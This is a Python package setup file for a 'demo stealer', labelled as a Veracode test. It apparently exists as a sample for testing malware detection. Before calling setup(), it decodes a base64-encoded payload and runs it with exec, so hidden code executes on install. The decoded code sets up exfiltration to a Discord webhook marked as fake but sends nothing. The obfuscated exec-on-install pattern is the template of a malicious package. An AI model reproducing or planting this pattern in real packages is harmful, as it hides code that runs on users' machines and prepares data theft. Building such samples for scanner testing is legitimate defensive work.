import base64
import os
print("=== Cortana-MD Demo Stealer (VERACODE TEST ONLY) ===")
payload = base64.b64decode(b'ZnJvbSB1cmxsaWIucmVxdWVzdCBpbXBvcnQgdXJsb3BlbixSZXF1ZXN0CmltcG9ydCBqc29uCndlYmhvb2sgPSAnaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvVEVTVC1PTkxZLURFTU8tMTIzNDUvRkFLRScKZGF0YSA9IHsibmFtZSI6ICJDb3J0YW5hLU1EIERlbW8gU3RlYWxlciIsImNvbnRlbnQiOiAiVGVzdCBleGZpbCB3b3JraW5nIC0gREVNbyBvbmx5In0KcnA9IHsianNvbiI6IGRhdGF9CnByaW50KCJFeGZpbCB0ZXN0IGNvbXBsZXRlIC0gREVNbyBvbmx5Iik=').decode()
exec(payload)
from setuptools import setup
setup(
    name="cortana-md-demo-stealer",
    version="1.2.40",
    description="INTERNAL VERACODE TEST ONLY",
    install_requires=["requests"]
)
